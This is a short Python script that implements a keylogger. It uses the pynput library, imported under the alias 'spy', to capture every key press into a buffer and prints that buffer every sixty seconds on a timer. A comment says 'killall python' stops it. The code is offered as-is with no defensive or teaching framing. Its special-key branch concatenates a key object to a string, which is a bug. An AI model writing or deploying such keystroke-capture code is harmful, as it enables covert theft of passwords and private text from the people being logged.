import threading
import pynput.keyboard as spy


store = ""          #global variable

def process_on_key_press(key):
    global store
    try:
        store = store + str(key.char)
        print(key)
    except:
        if key == key.space:
           store = store + " " 
        else:
            store = store + " " + key + " "

def report():
    global store
    print(store)
    store = ""
    timer = threading.Timer(60 , report)    #waiting for sixty second to store the logging
    timer.start()

keyboard_listener = spy.Listener(on_press = process_on_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()


#killall python to kill all the program